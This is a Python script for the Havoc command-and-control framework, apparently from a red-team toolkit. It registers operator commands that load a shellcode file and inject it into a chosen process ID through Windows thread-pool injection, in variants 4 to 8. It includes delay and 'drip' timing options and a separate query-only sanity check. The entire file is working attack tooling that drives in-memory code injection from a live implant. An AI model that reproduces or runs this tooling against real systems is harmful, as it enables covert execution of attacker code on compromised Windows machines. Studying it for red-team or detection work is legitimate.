# PoolPartyBof — Windows thread-pool injection BOF (variants 4-8)
# Author: Udayveer Singh (@an0nud4y)
#   https://github.com/An0nUD4Y
#   https://x.com/m4lici0u5

from havoc import Demon, RegisterCommand, Packer
from os.path import exists


def PoolParty(demonID, *param):
    TaskID: str = None
    demon: Demon = None
    packer = Packer()

    pid: int = 0
    Varient: int = 0
    delay: int = 0
    drip: int = 0
    drip_ms: int = 0
    Shellcode: bytes = b''

    demon = Demon(demonID)

    if len(param) < 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Not enough arguments {len(param)}")
        return False

    if len(param) > 6:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Too many arguments")
        return False

    extras = list(param[3:])

    try:
        pid = int(param[0])
        Varient = int(param[2])
        if extras:
            if extras[0].lower() == "drip":
                drip = 1
                if len(extras) == 2:
                    drip_ms = int(extras[1])
                elif len(extras) > 2:
                    demon.ConsoleWrite(demon.CONSOLE_ERROR, "Too many arguments after drip")
                    return False
            else:
                delay = int(extras[0])
                if len(extras) >= 2:
                    if extras[1].lower() != "drip":
                        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Expected 'drip' after delay_sec")
                        return False
                    drip = 1
                    if len(extras) == 3:
                        drip_ms = int(extras[2])
                    elif len(extras) > 3:
                        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Too many arguments")
                        return False
    except ValueError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "PID, variant, delay_sec, and drip_ms must be integers")
        return False

    if pid <= 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please enter a valid PID")
        return False

    if delay < 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "delay_sec must be a non-negative integer")
        return False

    if drip_ms < 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "drip_ms must be a non-negative integer")
        return False

    if drip == 0 and drip_ms != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "drip_ms requires drip")
        return False

    shellcodeFile = param[1]

    if exists(shellcodeFile) is False:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"File containing shellcode not found: {shellcodeFile}")
        return False

    try:
        with open(shellcodeFile, "rb") as fh:
            Shellcode = fh.read()
    except OSError as exc:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Failed to read shellcode: {exc}")
        return False
    if len(Shellcode) == 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Shellcode is empty.")
        return False

    objectFile = ""
    if Varient == 4:
        objectFile = "PoolPartyBof_V4.x64.o"
    elif Varient == 5:
        objectFile = "PoolPartyBof_V5.x64.o"
    elif Varient == 6:
        objectFile = "PoolPartyBof_V6.x64.o"
    elif Varient == 7:
        objectFile = "PoolPartyBof_V7.x64.o"
    elif Varient == 8:
        objectFile = "PoolPartyBof_V8.x64.o"
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Supply Varient [4-8]")
        return False

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to execute {shellcodeFile}, with {Varient}th Varient.")

    packer.addint(pid)
    packer.addint(delay)
    packer.addint(drip)
    packer.addint(drip_ms)
    packer.addbytes(Shellcode)

    demon.InlineExecute(TaskID, "go", objectFile, packer.getbuffer(),
                        False)

    return TaskID


def PoolPartySanity(demonID, *param):
    TaskID: str = None
    demon: Demon = None
    packer = Packer()

    demon = Demon(demonID)

    if len(param) != 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Usage: poolparty-sanity [pid] [variant]")
        return False

    try:
        pid = int(param[0])
        variant = int(param[1])
    except ValueError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "PID and variant must be integers")
        return False

    if pid <= 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please enter a valid PID")
        return False

    objectFile = ""
    if variant == 4:
        objectFile = "PoolPartyBof_V4.x64.o"
    elif variant == 5:
        objectFile = "PoolPartyBof_V5.x64.o"
    elif variant == 6:
        objectFile = "PoolPartyBof_V6.x64.o"
    elif variant == 7:
        objectFile = "PoolPartyBof_V7.x64.o"
    elif variant == 8:
        objectFile = "PoolPartyBof_V8.x64.o"
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Supply variant [4-8]")
        return False

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to sanity-check PID {pid} variant {variant}.")
    packer.addint(pid)
    demon.InlineExecute(TaskID, "go", objectFile, packer.getbuffer(), False)
    return TaskID


RegisterCommand(PoolParty, "", "PoolPartyBof", "Thread-pool injection (v4-8). Does not sanity-check; run poolparty-sanity first if unsure. Prefer: 7 2 drip 50. Author: @an0nud4y", 0, "[PID] [/PATH/TO/SHELLCODE] [VARIANT] [DELAY_SEC] [drip [DRIP_MS]]", "1234 /tmp/shellcode.bin 7 2 drip 50")
RegisterCommand(PoolPartySanity, "", "poolparty-sanity", "Query-only PoolParty check (no inject). Author: @an0nud4y", 0, "[PID] [VARIANT]", "1234 7")
